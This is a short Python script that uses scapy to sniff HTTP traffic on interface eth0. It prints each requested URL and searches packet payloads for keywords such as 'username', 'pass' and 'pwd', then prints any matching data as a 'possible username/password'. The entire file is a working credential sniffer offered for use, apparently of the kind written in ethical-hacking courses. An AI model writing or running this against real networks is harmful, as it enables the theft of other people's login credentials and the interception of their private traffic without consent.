#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load ###
        keywords = ["username", "user", "login", "password", "pass", "pwd"]
        for keyword in keywords:
            if keyword in str(load):
                return load
                # print("\n\n[+] Possible username/password > " + load + "\n\n")
                # break

def process_sniffed_packet(packet):
    # print(packet)
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + str(login_info) + "\n\n")

    # if "login" in str(load):
            #     print(load)

sniff("eth0")